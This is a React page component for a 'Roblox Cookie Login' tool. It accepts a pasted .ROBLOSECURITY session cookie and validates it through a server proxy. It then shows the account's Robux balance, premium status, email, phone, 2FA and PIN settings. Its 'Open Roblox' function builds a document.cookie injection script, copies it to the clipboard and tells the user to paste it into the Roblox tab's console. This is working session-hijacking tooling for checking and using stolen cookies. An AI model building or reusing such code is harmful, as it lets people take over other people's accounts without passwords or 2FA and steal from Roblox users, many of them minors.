"use client"

import { useState } from "react"
import { motion } from "framer-motion"
import { Button } from "@/components/ui"
import toast from "react-hot-toast"

export default function RobloxLoginPage() {
  const [cookie, setCookie] = useState("")
  const [loading, setLoading] = useState(false)
  const [userData, setUserData] = useState<any>(null)
  const [error, setError] = useState("")
  const [showCookie, setShowCookie] = useState(false)
  const [consoleLines, setConsoleLines] = useState<string[]>([
    "ROBLOX COOKIE LOGIN engine initialized..."
  ])

  function addLog(msg: string) {
    const ts = new Date().toLocaleTimeString()
    setConsoleLines(prev => [...prev, `[${ts}] ${msg}`])
  }

  async function handleVerify() {
    if (!cookie.trim()) return
    setLoading(true)
    setError("")
    setUserData(null)
    addLog(`Cookie received (${cookie.length} chars)`)

    try {
      addLog("Validating via server proxy...")
      const res = await fetch("/api/roblox", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cookie: cookie.trim() }),
      })

      if (!res.ok) {
        const err = await res.json().catch(() => ({ error: "Unknown error" }))
        setError(err.error || "Invalid cookie")
        addLog(`ERROR: ${err.error || "Validation failed"}`)
        setLoading(false)
        return
      }

      const data = await res.json()
      setUserData(data)
      addLog(`SUCCESS: ${data.username || "?"} | Robux: R$${data.robux?.toLocaleString() || 0}`)
    } catch {
      setError("Network error. Check your connection.")
      addLog("ERROR: Network failure")
    } finally { setLoading(false) }
  }

  function openRobloxSession() {
    const ck = cookie.trim()
    const script = `document.cookie=".ROBLOSECURITY=${ck};domain=.roblox.com;path=/;Secure";location.reload()`
    navigator.clipboard.writeText(script).catch(() => {})

    const w = window.open("https://www.roblox.com/home", "_blank")
    if (w) {
      try { (w as any).eval(script) } catch {}
    }

    toast("Script copiado → F12 → Console → Ctrl+V → Enter", { duration: 6000, icon: "📋" })
    addLog("✅ Script copied — paste in Roblox console (F12 → Console → Ctrl+V → Enter)")
  }

  return (
    <div className="min-h-[calc(100vh-4rem)] relative overflow-hidden bg-background">
      <div className="absolute inset-0 opacity-30">
        <div className="absolute -top-40 -left-40 w-96 h-96 rounded-full bg-red-500/20 blur-[120px] animate-pulse" />
        <div className="absolute top-1/2 -right-40 w-80 h-80 rounded-full bg-orange-500/15 blur-[100px] animate-pulse" style={{ animationDelay: "1s" }} />
        <div className="absolute -bottom-20 left-1/3 w-72 h-72 rounded-full bg-yellow-500/10 blur-[100px] animate-pulse" style={{ animationDelay: "2s" }} />
      </div>

      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="relative z-10 flex flex-col lg:flex-row gap-0 min-h-[calc(100vh-4rem)]">
        {/* Left Panel - Clean Info Card */}
        <div className="lg:w-[320px] bg-card/40 backdrop-blur-xl border-r border-border/50 flex flex-col items-center p-6 pt-10">
          <div className="relative mb-4">
            <div className="absolute inset-0 rounded-full bg-red-500/30 blur-2xl scale-150 animate-pulse" />
            <div className="w-36 h-36 rounded-full border-[3px] border-red-500/60 bg-card/80 flex items-center justify-center overflow-hidden relative z-10 shadow-[0_0_40px_rgba(239,68,68,0.2)]">
              {userData?.avatarUrl ? (
                <img src={userData.avatarUrl} alt="Avatar" className="w-full h-full object-cover" />
              ) : (
                <svg className="w-14 h-14 text-red-500/40" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
              )}
            </div>
          </div>

          <h2 className="text-xl font-bold font-mono bg-gradient-to-r from-red-400 to-orange-400 bg-clip-text text-transparent text-center">
            {userData?.username || "Guest"}
          </h2>
          <p className={`text-xs font-mono mt-1.5 ${userData ? "text-green-400" : "text-muted-foreground"}`}>
            {userData ? "Cookie Validated ✅" : "Paste cookie →"}
          </p>

          {userData && (
            <div className="mt-6 w-full space-y-2">
              {/* Robux Card */}
              <div className="bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/20 rounded-xl p-3.5 text-center">
                <p className="text-[10px] text-green-400/70 uppercase tracking-wider font-mono">Robux</p>
                <p className="text-2xl font-black text-green-400 font-mono">R$ {userData.robux?.toLocaleString()}</p>
              </div>

              {/* Premium Badge */}
              <div className={`rounded-xl p-3 text-center border ${userData.premium ? "bg-yellow-500/10 border-yellow-500/30" : "bg-zinc-800/50 border-zinc-700/30"}`}>
                <p className={`text-sm font-bold font-mono ${userData.premium ? "text-yellow-400" : "text-zinc-400"}`}>
                  {userData.premium ? "⭐ PREMIUM" : "Free Account"}
                </p>
              </div>

              {/* Security Info */}
              <div className="bg-card/60 border border-border/50 rounded-xl p-3.5 space-y-2.5">
                <p className="text-[10px] text-muted-foreground uppercase tracking-wider font-mono text-center mb-1">Security</p>
                {[
                  { label: "Email", value: userData.email || "—", ok: userData.emailVerified },
                  { label: "Phone", value: userData.phone || "—", ok: userData.phoneVerified },
                  { label: "2FA", value: userData.twoFa ? "ON" : "OFF", ok: userData.twoFa },
                  { label: "PIN", value: userData.pin ? "ON" : "OFF", ok: userData.pin },
                ].map(({ label, value, ok }) => (
                  <div key={label} className="flex items-center justify-between text-xs">
                    <span className="text-zinc-500 font-mono">{label}</span>
                    <span className={`font-mono ${ok ? "text-green-400" : "text-zinc-400"}`}>
                      {value} {label === "2FA" || label === "PIN" ? "" : ok ? "✓" : ""}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>

        {/* Right Panel - Form */}
        <div className="flex-1 flex flex-col justify-start pt-16 lg:pt-24 px-8 lg:px-20">
          <div className="mb-8">
            <h1 className="text-5xl lg:text-6xl font-black font-mono tracking-tighter">
              <span className="bg-gradient-to-r from-red-500 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
                ROBLOX COOKIE
              </span>
              <br />
              <span className="text-foreground">LOGIN</span>
            </h1>
            <p className="text-sm text-muted-foreground font-mono mt-3 tracking-widest">.ROBLOSECURITY AUTHENTICATION</p>
          </div>

          {/* Cookie Input */}
          <label className="text-xs font-mono font-bold text-foreground/80 mb-2.5 uppercase tracking-wider block">
            .ROBLOSECURITY Cookie
          </label>
          <div className="flex gap-3 max-w-2xl">
            <div className="flex-1 relative group">
              <div className="absolute -inset-0.5 bg-gradient-to-r from-red-500 to-orange-500 rounded-2xl opacity-0 group-focus-within:opacity-40 blur transition-opacity" />
              <input
                type={showCookie ? "text" : "password"}
                value={cookie}
                onChange={e => setCookie(e.target.value)}
                onKeyDown={e => e.key === "Enter" && handleVerify()}
                placeholder="Paste .ROBLOSECURITY cookie..."
                className="relative w-full h-14 bg-card/80 backdrop-blur-sm border-2 border-border/50 rounded-2xl px-5 font-mono text-base text-foreground placeholder:text-muted-foreground/50 focus:outline-none focus:border-red-500/60 transition-all"
              />
            </div>
            <button
              onClick={() => setShowCookie(!showCookie)}
              className="w-14 h-14 bg-card/80 backdrop-blur-sm border border-border/50 rounded-2xl text-xl hover:bg-red-500/10 hover:border-red-500/30 transition-all flex items-center justify-center"
            >
              {showCookie ? "🙈" : "👁️"}
            </button>
          </div>
          <p className="text-[10px] text-muted-foreground font-mono mt-2 max-w-2xl">
            Format: _|WARNING:-DO-NOT-SHARE-THIS...
          </p>

          {loading && (
            <div className="mt-5 h-2 bg-card/50 rounded-full overflow-hidden border border-border/30 max-w-2xl">
              <motion.div
                className="h-full bg-gradient-to-r from-red-500 via-orange-400 to-yellow-400 rounded-full"
                animate={{ x: ["-100%", "100%"] }}
                transition={{ duration: 1.5, repeat: Infinity, ease: "linear" }}
                style={{ width: "50%" }}
              />
            </div>
          )}

          {error && (
            <motion.p initial={{ opacity: 0, y: -5 }} animate={{ opacity: 1, y: 0 }} className="text-red-400 text-sm font-mono mt-3 bg-red-500/10 border border-red-500/20 rounded-xl px-4 py-2 max-w-2xl">
              {error}
            </motion.p>
          )}

          {/* Buttons */}
          <div className="flex gap-3 mt-6 max-w-2xl">
            <Button
              onClick={handleVerify}
              loading={loading}
              disabled={!cookie.trim()}
              className="flex-1 h-14 text-base font-mono font-bold bg-gradient-to-r from-red-500 to-orange-600 hover:from-red-400 hover:to-orange-500 border-0 shadow-lg shadow-red-500/20 transition-all"
            >
              VERIFY
            </Button>
            {userData && (
              <Button
                onClick={openRobloxSession}
                className="flex-1 h-14 text-base font-mono font-bold bg-green-600/80 hover:bg-green-500/80 backdrop-blur-sm border border-green-400/30"
              >
                🎮 Open Roblox
              </Button>
            )}
          </div>

          {userData && (
            <div className="mt-3 p-4 rounded-2xl bg-green-500/5 border border-green-500/20 max-w-2xl text-center">
              <p className="text-xs text-green-400/80 font-mono">
                📋 Script copied! In Roblox tab: <span className="text-white font-bold">F12</span> → <span className="text-white font-bold">Console</span> → <span className="text-white font-bold">Ctrl+V</span> → <span className="text-white font-bold">Enter</span>
              </p>
            </div>
          )}

          {/* Console Log */}
          <div className="mt-6 bg-black/40 backdrop-blur-md border border-border/30 rounded-2xl p-4 h-32 font-mono text-xs overflow-y-auto max-w-2xl">
            {consoleLines.map((line, i) => (
              <p key={i} className={`${line.includes("ERROR") ? "text-red-400" : line.includes("SUCCESS") ? "text-green-400" : "text-orange-400/80"}`}>
                {line}
              </p>
            ))}
          </div>
        </div>
      </motion.div>
    </div>
  )
}
